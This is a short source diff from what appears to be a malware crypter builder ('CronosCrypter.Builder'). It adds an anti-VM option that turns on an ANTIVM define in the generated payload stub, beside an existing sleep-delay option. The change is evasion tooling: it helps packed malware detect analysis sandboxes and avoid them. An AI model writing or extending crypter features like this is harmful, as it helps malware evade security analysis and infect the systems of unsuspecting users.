@@ -160,6 +160,10 @@ namespace CronosCrypter.Builder
                 stub = stub.Replace("[SLEEP]", _settings.sleep.ToString());
                 stub = stub.Replace("//#define SLEEP", "#define SLEEP");
             }
+            if (_settings.doAntiVM == true)
+            {
+                stub = stub.Replace("//#define ANTIVM", "#define ANTIVM");
+            }
 
             return stub;
         }
